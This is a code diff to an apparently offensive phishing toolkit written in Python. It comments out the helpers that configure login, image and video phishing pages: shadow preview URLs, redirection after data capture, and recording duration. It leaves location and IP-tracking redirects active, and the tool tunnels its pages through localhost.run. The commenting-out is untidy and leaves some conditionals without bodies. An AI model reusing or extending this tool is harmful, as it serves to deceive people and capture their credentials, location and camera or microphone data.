@@ -873,28 +873,28 @@ def ssh_key():
         shell("ssh-keyscan -H localhost.run >> ~/.ssh/known_hosts", True)
 
 # Additional configuration for login phishing
-def set_login():
-    global url
-    metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
-    write_meta(metaurl)
-    if url is not None:
-        redirect_url = url
-    else:
-        redirect_url = input(f"\n{ask}{bcyan}Enter redirection url{bcyan}[{red}press enter to skip{bcyan}] : {green}")
-    write_redirect(redirect_url)
+#def set_login():
+ #   global url
+  #  metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
+  #  write_meta(metaurl)
+  #  if url is not None:
+   #     redirect_url = url
+    #else:
+     #   redirect_url = input(f"\n{ask}{bcyan}Enter redirection url{bcyan}[{red}press enter to skip{bcyan}] : {green}")
+    #write_redirect(redirect_url)
 
 # Additional configuration for image phishing
-def set_image():
-    global fest, ytid
-    sed("festName", fest, f"{site_dir}/index.html")
-    ytid = sub("([/%+&?={} ])", "", ytid)
-    sed("ytId", ytid, f"{site_dir}/index.html")
+#def set_image():
+ #   global fest, ytid
+  #  sed("festName", fest, f"{site_dir}/index.html")
+   # ytid = sub("([/%+&?={} ])", "", ytid)
+   # sed("ytId", ytid, f"{site_dir}/index.html")
 
 # Additional configuration for video phishing
-def set_duration():
-    global duration
-    recordingTime = str(duration)
-    sed("recordingTime", recordingTime, f"{site_dir}/recorder.js")
+#def set_duration():
+  #  global duration
+   # recordingTime = str(duration)
+   # sed("recordingTime", recordingTime, f"{site_dir}/recorder.js")
     
 
 # Set redirection after data capture
@@ -1360,13 +1360,13 @@ def secondary_menu(sites, name):
             remove("site.zip")
         copy(site, site_dir)
         #if name == "Login":
-            set_login()
+            #set_login()
         #if name == "Image":
-            set_image()
+            #set_image()
         #if name == "ClipBoard":
-            set_redirect(redir_url, write=True)
+            #set_redirect(redir_url, write=True)
         #if name in [ "Video", "Audio"]:
-            set_duration()
+            #set_duration()
         if name in ["Location", "IP Tracker", "Device"]:
             set_redirect(redir_url)
     server()
